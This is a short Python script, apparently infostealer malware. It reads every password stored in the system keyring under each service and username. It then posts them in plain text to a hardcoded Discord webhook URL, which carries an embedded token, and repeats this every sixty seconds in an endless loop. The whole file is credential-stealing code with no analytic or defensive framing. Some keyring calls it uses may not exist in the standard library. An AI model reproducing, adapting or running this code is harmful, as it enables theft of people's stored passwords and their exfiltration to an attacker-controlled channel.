import keyring
import requests
import time

def steal_passwords():
    all_passwords = {}
    for service_name in keyring.get_services():
        for username in keyring.get_keys(service_name):
            password = keyring.get_password(service_name, username)
            all_passwords[f'{service_name}:{username}'] = password
    return all_passwords

def send_passwords_to_discord(passwords):
    webhook_url = 'https://discord.com/api/webhooks/1241497177771999233/IBBDUMt981jObFoKodixaPC7TWaV-apMYGUWYnyizwUtWWiKKZhp4Wzq91dFbGmFcuhX'
    message = ''
    for app, password in passwords.items():
        message += f'{app}: {password}\n'
    requests.post(webhook_url, data={'content': message})

while True:
    all_passwords = steal_passwords()
    if all_passwords:
        send_passwords_to_discord(all_passwords)
        time.sleep(60)
